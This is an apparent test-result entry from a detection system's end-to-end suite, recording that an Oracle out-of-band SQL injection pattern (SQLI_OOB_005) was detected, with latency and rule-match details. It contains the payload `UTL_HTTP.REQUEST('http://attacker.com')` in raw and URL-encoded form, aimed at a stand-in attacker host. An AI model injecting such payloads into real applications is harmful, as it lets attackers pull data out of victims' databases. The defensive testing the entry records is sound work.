name: test_e2e_with_logs[090_SQLI_OOB_005]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_OOB_005` |
| **Name** | Out-of-band via UTL_HTTP |
| **Category** | SQLI |
| **Subcategory** | out_of_band |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `UTL_HTTP.REQUEST('http://attacker.com')`
- **Encoded**: `UTL_HTTP.REQUEST%28%27http%3A%2F%2Fattacker.com%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 08:20:35.000 UTC

| **Rule Match** | ✅ Match |
